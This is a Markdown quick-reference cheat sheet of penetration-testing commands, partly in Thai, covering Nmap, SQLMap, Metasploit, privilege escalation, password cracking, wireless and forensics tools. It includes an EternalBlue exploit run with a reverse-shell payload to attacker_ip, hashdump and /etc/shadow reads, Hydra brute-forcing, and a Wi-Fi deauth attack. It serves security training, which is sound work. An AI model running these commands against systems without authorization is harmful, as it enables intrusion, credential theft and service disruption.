# Quick Reference Guide - Cybersecurity Tools

## Network Scanning

### Nmap
```bash
# Basic Scans
nmap target_ip                    # Basic scan
nmap -sn 192.168.1.0/24          # Ping sweep
nmap -sS target_ip               # TCP SYN scan
nmap -sU target_ip               # UDP scan
nmap -sV target_ip               # Service version detection
nmap -O target_ip                # OS detection

# Advanced Scans
nmap -A target_ip                # Aggressive scan
nmap -p 80,443 target_ip         # Specific ports
nmap -p 1-1000 target_ip         # Port range
nmap --script vuln target_ip     # Vulnerability scan
nmap --script=default target_ip  # Default scripts
```

### Masscan
```bash
masscan -p1-65535 192.168.1.0/24 --rate=1000
masscan -p80,443 192.168.1.0/24 --rate=10000
```

## Web Application Testing

### Burp Suite
```
1. เปิด Burp Suite
2. ตั้งค่า Proxy: 127.0.0.1:8080
3. ติดตั้ง CA Certificate
4. เปิด Intercept
5. Browse target website
6. ส่งไปที่ Repeater/Intruder
```

### SQLMap
```bash
# Basic SQL Injection
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump

# POST Request
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123"
```

### Nikto
```bash
nikto -h http://target.com
nikto -h http://target.com -p 80,443
nikto -h http://target.com -o results.txt
```

## Exploitation

### Metasploit
```bash
# เริ่มต้น Metasploit
msfconsole

# หาและใช้ exploit
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# Meterpreter Commands
sysinfo
getuid
getsystem
hashdump
screenshot
```

### Searchsploit
```bash
searchsploit apache
searchsploit -m 12345
searchsploit -w windows
```

## System Enumeration

### Linux
```bash
# System Info
uname -a
cat /etc/issue
cat /etc/passwd
cat /etc/shadow
id
whoami

# Network
netstat -tulpn
ss -tulpn
ifconfig
ip addr

# Processes
ps aux
ps -ef
top
htop

# Files
find / -name "*.conf" 2>/dev/null
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null
```

### Windows
```cmd
# System Info
systeminfo
whoami
whoami /priv
net user
net localgroup administrators

# Network
ipconfig /all
netstat -an
route print
arp -a

# Processes
tasklist
wmic process list full
```

## Privilege Escalation

### Linux
```bash
# Check sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Cron jobs
cat /etc/crontab
crontab -l

# Kernel exploits
uname -a
searchsploit kernel version
```

### Windows
```cmd
# Check privileges
whoami /priv

# Unquoted service paths
wmic service get name,displayname,pathname,startmode

# Registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

# Scheduled tasks
schtasks /query /fo LIST /v
```

## Password Attacks

### John the Ripper
```bash
# Crack passwords
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt
john --show hashes.txt
```

### Hashcat
```bash
# Crack MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack NTLM
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with rules
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Hydra
```bash
# HTTP Login
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt target.com ssh

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ftp
```

## Forensics

### Volatility
```bash
# Memory analysis
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 netscan
volatility -f memory.dump --profile=Win7SP1x64 filescan
```

### Binwalk
```bash
binwalk firmware.bin
binwalk -e firmware.bin
binwalk -M firmware.bin
```

### Strings
```bash
strings binary_file
strings -a binary_file
strings -n 10 binary_file
```

## Steganography

### Steghide
```bash
steghide embed -cf image.jpg -ef secret.txt
steghide extract -sf image.jpg
steghide info image.jpg
```

### Stegsolve
```bash
# Java tool สำหรับวิเคราะห์รูปภาพ
java -jar stegsolve.jar
```

## Wireless

### Aircrack-ng
```bash
# Monitor mode
airmon-ng start wlan0

# Scan networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Deauth attack
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

## Reverse Engineering

### GDB
```bash
gdb ./binary
break main
run
info registers
disassemble main
x/32x $esp
```

### Radare2
```bash
r2 binary
aa
afl
pdf @main
```

## Python Scripting

### Port Scanner
```python
import socket
import sys

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            return True
        sock.close()
    except:
        return False

host = sys.argv[1]
for port in range(1, 1001):
    if scan_port(host, port):
        print(f"Port {port}: Open")
```

### HTTP Request
```python
import requests

url = "http://target.com"
headers = {"User-Agent": "Mozilla/5.0"}
response = requests.get(url, headers=headers)
print(response.status_code)
print(response.text)
```

## Useful Wordlists

### Common Paths
```
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
```

### SecLists
```bash
# ติดตั้ง SecLists
git clone https://github.com/danielmiessler/SecLists.git
```

## One-liners

### Bash
```bash
# Port scan
for port in {1..1000}; do (echo >/dev/tcp/192.168.1.1/$port) 2>/dev/null && echo "Port $port is open"; done

# Download file
wget http://target.com/file.txt
curl -O http://target.com/file.txt

# Base64 decode
echo "SGVsbG8gV29ybGQ=" | base64 -d

# Find writable directories
find / -type d -writable 2>/dev/null
```

### PowerShell
```powershell
# Port scan
1..1000 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $sock.Connect("192.168.1.1", $_); if ($sock.Connected) { "Port $_ is open" } }

# Download file
Invoke-WebRequest -Uri "http://target.com/file.txt" -OutFile "file.txt"

# Base64 decode
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGVsbG8gV29ybGQ="))
```

---

**หมายเหตุ:** ใช้เครื่องมือเหล่านี้ในสภาพแวดล้อมที่ได้รับอนุญาตเท่านั้น